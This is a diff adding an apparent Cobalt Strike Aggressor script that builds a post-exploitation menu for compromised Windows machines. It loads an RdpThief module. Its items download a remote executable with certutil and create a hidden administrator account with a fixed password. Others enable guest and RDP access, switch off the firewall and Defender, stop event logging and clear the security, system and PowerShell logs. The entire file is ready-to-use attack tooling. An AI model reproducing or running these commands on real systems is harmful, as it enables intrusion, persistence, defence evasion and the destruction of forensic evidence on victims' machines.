@@ -1,0 +1,87 @@
+menu "系统操作" {
+        include(script_resource("modules/RdpThief.cna"));
+
+			    item "远程下载exe" {
+             prompt_text("远程文件地址?默认下载到c:\\windows\\helper.exe", "", lambda({
+            bshell(@ids, "Certutil.exe -urlcache -split -f $1 C:\\windows\\helper.exe");
+        }, @ids => $1));
+    }	
+	
+				item "激活guest用户" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "net user guest /active:yes");
+			}
+		}
+				item "关闭防火墙" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "netsh advfirewall set allprofiles state off");
+			}
+		}
+				item "开启RDP服务"{
+            local('$bid');
+                $bid = $1;
+                if (!-isadmin $bid['@']){
+                    show_error("Permission Denied!");
+                }
+                else{
+                    bshell($bid,"REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f");
+                }
+            }
+				item "开启RDP防火墙规则"{
+            local('$bid');
+                $bid = $1;
+                if (!-isadmin $bid['@']){
+                    show_error("Permission Denied!");
+                }
+                else{
+                    bshell($bid,"netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow");
+                }
+            }
+				item "建立用户并加入管理员组" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "net user admin123 admin@123 /add");
+				bshell($1, "net localgroup administrators admin123 /add");
+			}
+		}
+			    menu "隐藏文件" {
+			    item "隐藏" {
+             prompt_text("文件路径", "", lambda({
+            bshell(@ids, "attrib +h +s $1");
+        }, @ids => $1));
+    }	
+			    item "显示" {
+             prompt_text("文件路径", "", lambda({
+            bshell(@ids, "attrib -h -s $1");
+        }, @ids => $1));
+    }
+	}
+				item "组策略关闭defender" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD");
+			}
+		}
+				item "禁用事件服务" {
+			local('$bid');
+			foreach $bid ($1){
+				bshell($1, "sc stop Schedule");
+				bshell($1, "sc stop wecsvc");
+				bshell($1, "sc stop eventlog");
+			}
+		}
+			    item "清除系统日志" {
+             prompt_text("确定清除?", "请详细阅读网络安全法", lambda({
+            bshell(@ids, "wevtutil cl security");
+			bshell(@ids, "wevtutil cl system");
+			bshell(@ids, "wevtutil cl application");
+			bshell(@ids, "wevtutil cl \"windows powershell\"");
+        }, @ids => $1));
+    }	
+
+
+
+
+}
